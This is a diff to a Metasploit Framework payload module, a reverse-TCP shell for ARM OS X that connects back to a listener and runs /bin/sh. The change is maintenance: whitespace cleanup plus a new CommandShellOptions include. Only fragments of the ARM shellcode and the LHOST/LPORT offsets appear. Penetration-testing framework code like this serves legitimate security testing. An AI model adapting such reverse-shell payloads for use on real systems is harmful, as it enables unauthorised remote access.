@@ -3,22 +3,22 @@
 ##
 
 ##
-# This file is part of the Metasploit Framework and may be subject to 
+# This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
 # http://metasploit.com/framework/
 ##
 
-
 require 'msf/core'
 require 'msf/core/handler/reverse_tcp'
 require 'msf/base/sessions/command_shell'
-
+require 'msf/base/sessions/command_shell_options'
 
 module Metasploit3
 
 	include Msf::Payload::Single
 	include Msf::Payload::Osx
+	include Msf::Sessions::CommandShellOptions
 
 	def initialize(info = {})
 		super(merge_info(info,
@@ -38,7 +38,7 @@ module Metasploit3
 							'LPORT'    => [ 30, 'n'    ],
 							'LHOST'    => [ 32, 'ADDR' ],
 						},
-					'Payload' =>			
+					'Payload' =>
 						[
 							# socket
 							0xe3a00002, # mov r0, #0x2
@@ -95,7 +95,7 @@ module Metasploit3
 							# /bin/sh
 							0x6e69622f,
 							0x0068732f
-						].pack("V*")	
+						].pack("V*")
 				}
 			))
 	end
